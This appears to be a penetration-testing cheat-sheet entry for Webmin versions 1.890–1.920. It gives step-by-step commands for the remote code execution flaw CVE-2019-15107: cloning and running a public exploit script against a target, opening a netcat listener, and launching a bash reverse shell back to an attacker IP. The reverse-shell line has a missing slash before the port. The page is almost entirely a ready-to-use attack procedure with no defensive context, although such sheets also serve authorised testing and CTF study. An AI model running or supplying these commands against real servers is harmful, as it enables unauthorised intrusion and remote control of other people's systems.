---
title: Webmin
desc: A web-based server management control panel for Unix-like systems. It usually listens for connections on port 10000.
tags: [ReverseShell, Web]
alts: []
website:
render_with_liquid: false
---

## Webmin 1.890 - 1.920 Remote Code Execution

```sh
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107
python CVE-2019-15107.py <target-ip>

# -------------------------------------------------

# Listen on attack machine
nc -lvnp 4444

# ------------------------------------------------

# Reverse Shell on target machine
bash -i >& /dev/tcp/<attacker-ip>4444 0>&1
```